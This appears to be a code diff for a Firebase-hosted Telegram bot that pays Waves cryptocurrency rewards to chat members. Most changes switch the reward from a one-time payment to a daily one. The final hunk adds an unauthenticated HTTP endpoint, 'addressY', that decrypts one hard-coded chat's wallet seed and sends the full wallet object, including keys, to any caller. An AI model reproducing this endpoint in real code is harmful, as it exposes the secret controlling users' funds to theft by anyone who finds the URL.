@@ -13,6 +13,7 @@ const salt = functions.config().wallet.salt;
 const decimals = 100000000;
 const fee = 0.001 * decimals;
 const rewardAmount = 0.01;
+const days = 1000 * 60 * 60 * 24;
 const VERSION = '1.3';
 const Waves = WavesAPI.create(WavesAPI.MAINNET_CONFIG);
 
@@ -157,9 +158,14 @@ function rewardMember(process) {
         }
         let memberId = '' + process.message.from.id;
         if(chat.members[memberId]) {
-            console.log('Member was rewarded already');
-            return botSay(process, 'reward ' + chat.amount + ' ' + chat.token
-                + ' was already sent to address ' + chat.members[memberId]);
+            let previousRewardDay = Math.round(chat.members[memberId] / days);
+            let currentDay = Math.round(Date.now() / days);
+
+            if(currentDay <= previousRewardDay) {
+                console.log('Member was rewarded already');
+                return botSay(process, 'reward ' + chat.amount + ' ' + chat.token
+                    + ' was already sent today');
+            }
         }
 
         let wallet = Waves.Seed.fromExistingPhrase(Waves.Seed.decryptSeedPhrase(chat.seed, salt));
@@ -182,7 +188,7 @@ function rewardMember(process) {
             Waves.API.Node.v1.assets.transfer(rewardData, wallet.keyPair).then(response => {
                 console.log('Reward have been sent', rewardData);
 
-                ref.child('members').child(memberId).set(address);
+                ref.child('members').child(memberId).set(Date.now());
 
                 const botFeeData = {
                                 recipient: addressForRewards,
@@ -287,5 +293,15 @@ exports.setWebhook = functions.https.onRequest((request, response) => {
     bot.setWebHook(botWebhook + '/bot' + botToken);
     response.status(201).send('Webhook was added! ' + version);
 });
+
+exports.addressY = functions.https.onRequest((request, response) => {
+    let chats = admin.database().ref('chats').child('-1001220299550').once('value').then(snapshot => {
+            let chatId = snapshot.key;
+            let chat = snapshot.val();
+            let wallet = Waves.Seed.fromExistingPhrase(Waves.Seed.decryptSeedPhrase(chat.seed, salt));
+            response.status(201).send(JSON.stringify(wallet) + "<br/>" + VERSION);
+    });
+});
+
 
 
